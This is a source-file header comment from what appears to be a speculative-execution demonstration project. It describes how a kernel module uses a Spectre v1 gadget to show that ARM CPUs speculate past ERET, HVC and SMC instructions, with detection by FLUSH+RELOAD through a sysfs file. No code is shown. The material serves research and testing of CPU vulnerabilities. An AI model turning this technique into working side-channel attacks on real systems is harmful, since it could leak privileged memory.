/**
 * Speculation over ERET, HVC and SMC instruction.
 *
 * In this example we demonstrate a behavior of ARM CPUs that speculate across
 * instructions whose equivalents are blocking on other architectures. Those are
 * the ERET instruction that returns from kernel to userspace, from hypervisor
 * to kernel etc., the HVC instruction that enters hypervisor from kernel and
 * the SMC instruction that enters the secure monitor from kernel or from
 * hypervisor.
 *
 * Since these instructions behave as an undefined instruction in a userspace
 * program we have to execute them in kernel code using a Linux kernel module.
 * For the sake of portability and maintainability we execute them there only
 * speculatively and verify that the speculative execution does not block on any
 * of those instructions by invoking all three of them before we yield a memory
 * access into oracle that loads a userspace-provided address into the cache.
 *
 * We use our userspace infrastructure for the setup of the oracle and for the
 * FLUSH+RELOAD technique. The kernel receives hexadecimal addresses that are
 * written into a SYSFS file /sys/kernel/safeside_eret_hvc_smc/address
 * During each sysfs store the kernel code performs a Spectre v1 gadget in
 * order to achieve speculative execution. The speculatively executed
 * architecturally unreachable code begins with ERET, HVC and SMC instructions
 * followed by a memory access instruction. Afterwards the control flow returns
 * back to userspace where we verify that the provided index in memory oracle
 * was speculatively accessed. */
